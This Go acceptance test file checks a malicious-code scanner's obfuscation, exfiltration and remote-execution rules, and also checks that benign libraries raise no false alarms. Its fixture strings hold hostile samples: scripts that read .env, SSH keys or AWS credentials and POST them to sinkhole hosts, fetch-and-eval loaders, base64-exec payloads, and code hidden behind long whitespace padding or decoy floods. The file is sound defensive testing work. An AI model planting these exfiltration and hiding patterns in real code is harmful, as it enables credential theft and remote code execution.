package acceptance_test

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// scriptReport mirrors the parts of report.json the script tests read, with snippets and the score.
type scriptReport struct {
	Verdict  string `json:"verdict"`
	Score    int    `json:"score"`
	Findings []struct {
		RuleID   string `json:"rule_id"`
		Evidence []struct {
			Path    string `json:"path"`
			Line    int    `json:"line"`
			Snippet string `json:"snippet"`
		} `json:"evidence"`
	} `json:"findings"`
	Coverage struct {
		FilesSeen     int `json:"files_seen"`
		FilesAnalyzed int `json:"files_analyzed"`
		Skipped       []struct {
			Path   string `json:"path"`
			Reason string `json:"reason"`
		} `json:"skipped"`
	} `json:"coverage"`
}

func analyzeScript(t *testing.T, target string, wantCode int) scriptReport {
	t.Helper()
	out := filepath.Join(t.TempDir(), "out")
	stdout, stderr, code := runAgent(t, "analyze", "--unsafe-host", "-o", out, target)
	if code != wantCode {
		t.Fatalf("analyze exit = %d, want %d\nstdout: %s\nstderr: %s", code, wantCode, stdout, stderr)
	}
	b, err := os.ReadFile(filepath.Join(out, "report.json"))
	if err != nil {
		t.Fatal(err)
	}
	var rep scriptReport
	if err := json.Unmarshal(b, &rep); err != nil {
		t.Fatalf("report.json: %v", err)
	}
	return rep
}

// P2, P3, P7: obfuscated, padded and exfiltrating scripts are found, normal scripts are left alone.
func TestScriptHeuristics(t *testing.T) {
	pyPayload := "import os, urllib.request\nurllib.request.urlopen('https://c2.sinkhole.test/c', data=str(dict(os.environ)).encode())\n# pad the payload so that the encoded form is a long blob...............\n# pad the payload so that the encoded form is a long blob...............\n"
	minified := `!function(t){var e=Function("return this")()||this;function r(t){return String.fromCharCode.apply(null,t)}t.lib={r:r,g:e,s:setTimeout(function(){r([97])},0)}}(this);`

	tests := []struct {
		name string
		// inputs
		setup func(t *testing.T) string
		// expectations
		wantCode        int
		wantAt          map[string]string // rule to "path:line" that must be present
		wantSnippets    []string          // each must be in the snippet of some evidence
		wantAbsent      []string          // rules that must not appear anywhere
		wantScoreAtMost int               // checked when the exit code is 0
	}{
		{
			name:     "P3 padded JS: eval of an encoded payload hidden after 300 spaces",
			setup:    func(t *testing.T) string { return corpus(t, "p3-padded-js") },
			wantCode: 20,
			wantAt: map[string]string{
				"GAL-OBF-001":   "index.js:12",
				"GAL-OBF-002":   "index.js:12",
				"GAL-OBF-003":   "index.js:12",
				"GAL-EXFIL-001": "index.js:12",
			},
			wantSnippets: []string{"decoded:", "c2.sinkhole.test"},
		},
		{
			name:     "P3 padded Python: environment sent away from hidden code",
			setup:    func(t *testing.T) string { return corpus(t, "p3-padded-py") },
			wantCode: 20,
			wantAt:   map[string]string{"GAL-OBF-001": "app.py:9", "GAL-EXFIL-001": "app.py:9"},
		},
		{
			name:     "P2 fake interview repo: setup.js reads .env and posts it",
			setup:    func(t *testing.T) string { return corpus(t, "fake-interview-repo") },
			wantCode: 20,
			wantAt:   map[string]string{"GAL-EXFIL-001": "scripts/setup.js:3"},
		},
		{
			name:         "python decodes a payload and execs it",
			setup:        filesRepo(map[string]string{"app.py": "import base64\n\nexec(base64.b64decode('" + base64.StdEncoding.EncodeToString([]byte(pyPayload)) + "'))\n"}),
			wantCode:     20,
			wantAt:       map[string]string{"GAL-OBF-002": "app.py:3", "GAL-EXFIL-001": "app.py:3", "GAL-OBF-003": "app.py:3"},
			wantSnippets: []string{"decoded: urllib.request.urlopen('https://c2.sinkhole.test/c'"},
		},
		{
			name:     "script downloads code and runs it",
			setup:    filesRepo(map[string]string{"loader.js": "(async () => {\n  eval(await (await fetch('https://c2.sinkhole.test/p.js')).text());\n})();\n"}),
			wantCode: 10,
			wantAt:   map[string]string{"GAL-EXEC-001": "loader.js:2"},
		},
		{
			name:     "python script reads .env and posts it",
			setup:    filesRepo(map[string]string{"sync.py": "import requests\n\nenv = open('.env').read()\nrequests.post('https://c2.sinkhole.test/e', data=env)\n"}),
			wantCode: 20,
			wantAt:   map[string]string{"GAL-EXFIL-001": "sync.py:3"},
		},
		{
			name:     "code padded behind a closed block comment",
			setup:    filesRepo(map[string]string{"index.js": "/* status */" + strings.Repeat(" ", 300) + "eval(atob('aGVsbG8='));\n"}),
			wantCode: 20,
			wantAt:   map[string]string{"GAL-OBF-001": "index.js:1", "GAL-OBF-002": "index.js:1"},
		},
		{
			name:     "exfiltration on the line of a block comment",
			setup:    filesRepo(map[string]string{"c.js": "/* config loader */ const env = require('fs').readFileSync('.env','utf8'); require('https').request({hostname:'c.sinkhole.test',method:'POST'}).end(env);\n"}),
			wantCode: 20,
			wantAt:   map[string]string{"GAL-EXFIL-001": "c.js:1"},
		},
		{
			name:     "exfiltration through a module held in a variable",
			setup:    filesRepo(map[string]string{"c.js": "const fs = require('fs');\nconst client = require('https');\nconst env = fs.readFileSync('.env', 'utf8');\nclient.request({ hostname: 'c.sinkhole.test', method: 'POST' }).end(env);\n"}),
			wantCode: 20,
			wantAt:   map[string]string{"GAL-EXFIL-001": "c.js:3"},
		},
		{
			name:     "exfiltration through a named ESM import",
			setup:    filesRepo(map[string]string{"c.mjs": "import { readFileSync } from 'node:fs';\nimport { request } from 'node:https';\nconst env = readFileSync('.env', 'utf8');\nrequest({ hostname: 'c.sinkhole.test', method: 'POST' }).end(env);\n"}),
			wantCode: 20,
			wantAt:   map[string]string{"GAL-EXFIL-001": "c.mjs:3"},
		},
		{
			name:     "python decodes with codecs and execs",
			setup:    filesRepo(map[string]string{"app.py": "import codecs\nexec(codecs.decode('aW1wb3J0IG9z', 'base64'))\n"}),
			wantCode: 10,
			wantAt:   map[string]string{"GAL-OBF-002": "app.py:2"},
		},
		{
			name:     "1 MB of spaces hides code on line 1",
			setup:    filesRepo(map[string]string{"index.js": "run();" + strings.Repeat(" ", 1<<20) + "steal();\n"}),
			wantCode: 10,
			wantAt:   map[string]string{"GAL-OBF-001": "index.js:1"},
		},
		{
			name:     "credential directory joined from segments and sent",
			setup:    filesRepo(map[string]string{"c.js": "const path = require('path');\nconst os = require('os');\nconst dir = path.join(os.homedir(), '.ssh');\nrequire('https').request({ hostname: 'c.sinkhole.test', method: 'POST' }).end(fs.readdirSync(dir).join());\n"}),
			wantCode: 20,
			wantAt:   map[string]string{"GAL-EXFIL-001": "c.js:3"},
		},
		{
			name:     "python credential file joined from segments and posted",
			setup:    filesRepo(map[string]string{"c.py": "import os, requests\np = os.path.join(os.path.expanduser('~'), '.aws', 'credentials')\nrequests.post('https://c.sinkhole.test/c', data=open(p).read())\n"}),
			wantCode: 20,
			wantAt:   map[string]string{"GAL-EXFIL-001": "c.py:2"},
		},
		{
			name:     "download handed to eval through a promise",
			setup:    filesRepo(map[string]string{"loader.js": "fetch('https://c2.sinkhole.test/p.js')\n  .then((r) => r.text())\n  .then((t) => eval(t));\n"}),
			wantCode: 10,
			wantAt:   map[string]string{"GAL-EXEC-001": "loader.js:3"},
		},
		{
			name:     "credential file read far from the request that sends it",
			setup:    filesRepo(map[string]string{"c.py": "import requests\nstolen = open('/root/.aws/credentials').read()\n" + strings.Repeat("work()\n", 150) + "requests.post('https://c.sinkhole.test/c', data=stolen)\n"}),
			wantCode: 10,
			wantAt:   map[string]string{"GAL-EXFIL-001": "c.py:2"},
		},
		{
			name:     "twenty far pairs do not hide a near credential pair",
			setup:    filesRepo(map[string]string{"setup.js": farDecoys() + "const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'));\nfetch('https://c2.sinkhole.test/k', { method: 'POST', body: key });\n"}),
			wantCode: 20,
			wantAt:   map[string]string{"GAL-EXFIL-001": "setup.js:123"},
		},
		{
			name:     "credential path joined over several lines and sent",
			setup:    filesRepo(map[string]string{"c.js": "const f = fs.readFileSync(path.join(\n  os.homedir(),\n  '.aws',\n  'credentials',\n));\nfetch('https://c2.sinkhole.test/c', { method: 'POST', body: f });\n"}),
			wantCode: 20,
			wantAt:   map[string]string{"GAL-EXFIL-001": "c.js:3"},
		},
		{
			name: "benign notebook reads the aws config file and calls an API",
			setup: filesRepo(map[string]string{"analysis.py": `import os, json
import requests
from pathlib import Path
KAGGLE = Path.home() / '.kaggle' / 'kaggle.json'
AWS = Path.home() / '.aws' / 'config'
region = 'us-east-1'
if AWS.exists():
    region = AWS.read_text().split('region = ')[-1].strip()
r = requests.get(f'https://api.test/data?region={region}')
df = r.json()
print(len(df))
`}),
			wantCode:        0,
			wantAbsent:      []string{"GAL-EXFIL-001", "GAL-EXFIL-002"},
			wantScoreAtMost: 0,
		},
		{
			name: "benign auth helper reads the netrc file and calls an API",
			setup: filesRepo(map[string]string{"auth.py": `import netrc, os, requests
from pathlib import Path
def auth_for(host):
    rc = Path.home() / '.netrc'
    if not rc.exists():
        return None
    login, _, password = netrc.netrc(rc).authenticators(host)
    return (login, password)
def get(url):
    return requests.get(url, auth=auth_for('api.test'))
`}),
			wantCode:        0,
			wantAbsent:      []string{"GAL-EXFIL-001", "GAL-EXFIL-002"},
			wantScoreAtMost: 0,
		},
		{
			name: "benign ssh config helper reads the ssh config and opens a connection",
			setup: filesRepo(map[string]string{"hosts.js": "const fs = require('fs');\nconst net = require('net');\nconst path = require('path');\nconst os = require('os');\n" +
				"const cfg = fs.readFileSync(path.join(os.homedir(), '.ssh', 'config'), 'utf8');\n" +
				"const known = fs.readFileSync(os.homedir() + '/.ssh/known_hosts', 'utf8');\n" +
				"const host = /^Host (\\S+)/m.exec(cfg)[1];\nnet.connect(22, host).end(known.length + '\\n');\n"}),
			wantCode:        0,
			wantAbsent:      []string{"GAL-EXFIL-001"},
			wantScoreAtMost: 5,
		},
		{
			name: "benign requester copies the environment to drop the proxy variables",
			setup: filesRepo(map[string]string{"requester.py": "import os\nimport requests\n\n\nclass Requester:\n    def __init__(self):\n        self._http_requester = requests.Session()\n\n" +
				"    def get(self, url, **kwargs):\n        popped = False\n        old_env = dict(os.environ)\n" +
				"        for var_name in (\"http_proxy\", \"https_proxy\", \"no_proxy\"):\n            popped = True if os.environ.pop(var_name, None) else popped\n" +
				"        try:\n            return self._http_requester.get(url, **kwargs)\n        finally:\n            if popped:\n                os.environ.clear()\n                os.environ.update(old_env)\n"}),
			wantCode:        0,
			wantAbsent:      []string{"GAL-EXFIL-001", "GAL-EXFIL-002"},
			wantScoreAtMost: 5,
		},
		{
			name: "benign aws config loader defines where its files live",
			setup: filesRepo(map[string]string{"index.js": `'use strict';
const { join } = require('path');
const { homedir } = require('os');
const { readFile } = require('fs/promises');
const http = require('http');
const getHomeDir = () => process.env.HOME || homedir();
const getCredentialsFilepath = () => process.env.AWS_SHARED_CREDENTIALS_FILE || join(getHomeDir(), '.aws', 'credentials');
const getConfigFilepath = () => process.env.AWS_CONFIG_FILE || join(getHomeDir(), '.aws', 'config');
const loadSharedConfigFiles = async () => ({
  configFile: await readFile(getConfigFilepath(), 'utf8').catch(() => ''),
  credentialsFile: await readFile(getCredentialsFilepath(), 'utf8').catch(() => ''),
});
// IMDS credential provider
const httpRequest = (options) => new Promise((resolve, reject) => {
  const req = http.request({ method: 'GET', ...options, hostname: '169.254.169.254' });
  req.on('response', (res) => { const chunks = []; res.on('data', (c) => chunks.push(c)); res.on('end', () => resolve(Buffer.concat(chunks))); });
  req.on('error', reject);
  req.end();
});
module.exports = { loadSharedConfigFiles, httpRequest };
`}),
			wantCode:        0,
			wantAbsent:      []string{"GAL-EXFIL-001"},
			wantScoreAtMost: 5,
		},
		{
			name:            "benign app joins an env example path and calls an API",
			setup:           filesRepo(map[string]string{"server.js": "const t = fs.readFileSync(path.join(__dirname, '.env.example'), 'utf8');\nfetch('https://api.example.test').then((r) => r.json());\n"}),
			wantCode:        0,
			wantAbsent:      []string{"GAL-EXFIL-001", "GAL-EXFIL-002", "GAL-EXEC-001"},
			wantScoreAtMost: 0,
		},
		{
			name:            "benign minified library with Function, fromCharCode, atob and a data URI",
			setup:           func(t *testing.T) string { return corpus(t, "benign-minified-js") },
			wantCode:        0,
			wantAbsent:      []string{"GAL-OBF-001", "GAL-OBF-002", "GAL-EXFIL-001", "GAL-EXEC-001"},
			wantScoreAtMost: 5,
		},
		{
			name:            "benign python library uses base64, zlib, environ and requests",
			setup:           func(t *testing.T) string { return corpus(t, "benign-python-lib") },
			wantCode:        0,
			wantAbsent:      []string{"GAL-OBF-001", "GAL-OBF-002", "GAL-OBF-003", "GAL-EXFIL-001", "GAL-EXFIL-002", "GAL-EXEC-001", "GAL-EXEC-002"},
			wantScoreAtMost: 5,
		},
		{
			name:            "benign express app",
			setup:           func(t *testing.T) string { return corpus(t, "benign-express-app") },
			wantCode:        0,
			wantAbsent:      []string{"GAL-OBF-001", "GAL-OBF-002", "GAL-OBF-003", "GAL-EXFIL-001", "GAL-EXFIL-002", "GAL-EXEC-001", "GAL-EXEC-002"},
			wantScoreAtMost: 0,
		},
		{
			name: "benign app: dotenv, NODE_ENV and fetch to an API",
			setup: filesRepo(map[string]string{"server.js": "require('dotenv').config({ path: '.env' });\n" +
				"const prod = process.env.NODE_ENV === 'production';\n" +
				"fetch(prod ? 'https://api.example.test' : 'http://localhost:3000').then((r) => r.json());\n"}),
			wantCode:        0,
			wantAbsent:      []string{"GAL-EXFIL-001", "GAL-EXFIL-002", "GAL-OBF-001", "GAL-OBF-002"},
			wantScoreAtMost: 0,
		},
		{
			name:            "benign 4 MB minified line is analyzed completely",
			setup:           filesRepo(map[string]string{"dist/app.min.js": strings.Repeat(minified, 4<<20/len(minified)) + "\n"}),
			wantCode:        0,
			wantAbsent:      []string{"GAL-OBF-001", "GAL-OBF-002", "GAL-EXFIL-001", "GAL-EXEC-001"},
			wantScoreAtMost: 0,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Given a repo target
			target := tt.setup(t)
			// When the agent analyzes it
			rep := analyzeScript(t, target, tt.wantCode)
			// Then the rules appear at their evidence lines, and the unwanted rules and the coverage gaps do not
			for rule, at := range tt.wantAt {
				if !hasScriptFinding(rep, rule, at) {
					t.Errorf("no %s at %s in %+v", rule, at, rep.Findings)
				}
			}
			for _, want := range tt.wantSnippets {
				if !hasSnippet(rep, want) {
					t.Errorf("no evidence snippet contains %q in %+v", want, rep.Findings)
				}
			}
			for _, f := range rep.Findings {
				for _, absent := range tt.wantAbsent {
					if f.RuleID == absent {
						t.Errorf("unexpected %s: %+v", absent, f)
					}
				}
			}
			if tt.wantCode == 0 && rep.Score > tt.wantScoreAtMost {
				t.Errorf("score = %d, want at most %d", rep.Score, tt.wantScoreAtMost)
			}
			if rep.Coverage.FilesAnalyzed != rep.Coverage.FilesSeen {
				t.Errorf("analyzed %d of %d files", rep.Coverage.FilesAnalyzed, rep.Coverage.FilesSeen)
			}
		})
	}
}

// P2, P3: a script cannot hide a payload by filling the analyzer's work budget.
func TestScriptBudgetIsNotClean(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		setup func(t *testing.T) string
		// expectations
		wantCode int
		wantSkip string
	}{
		{
			name: "1 MB of decoy eval calls before a download that is run",
			setup: filesRepo(map[string]string{"loader.js": strings.Repeat("eval(", 1<<20/5) + "\n" +
				"eval(await (await fetch('https://c2.sinkhole.test/p.js')).text());\n"}),
			wantCode: 10,
			wantSkip: "budget",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Given a script whose decoys use up the work budget
			target := tt.setup(t)
			// When the agent analyzes it
			rep := analyzeScript(t, target, tt.wantCode)
			// Then the file is reported as not fully checked, and the verdict is not clean
			var got string
			for _, s := range rep.Coverage.Skipped {
				got = s.Reason
			}
			if got != tt.wantSkip {
				t.Errorf("skipped = %+v, want reason %q", rep.Coverage.Skipped, tt.wantSkip)
			}
		})
	}
}

func hasScriptFinding(rep scriptReport, rule, at string) bool {
	for _, f := range rep.Findings {
		for _, e := range f.Evidence {
			if f.RuleID == rule && fmt.Sprintf("%s:%d", e.Path, e.Line) == at {
				return true
			}
		}
	}
	return false
}

func hasSnippet(rep scriptReport, want string) bool {
	for _, f := range rep.Findings {
		for _, e := range f.Evidence {
			if strings.Contains(e.Snippet, want) {
				return true
			}
		}
	}
	return false
}

// farDecoys returns 20 credential files that a file reads at its top and
// sends 120 lines further down.
func farDecoys() string {
	var reads, names []string
	for i := range 20 {
		names = append(names, fmt.Sprintf("decoy%d", i))
		reads = append(reads, fmt.Sprintf("const decoy%d = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'));\n", i))
	}
	return strings.Join(reads, "") + strings.Repeat("work();\n", 100) + "fetch('https://telemetry.sinkhole.test/ping', { body: [" + strings.Join(names, ", ") + "] });\n"
}
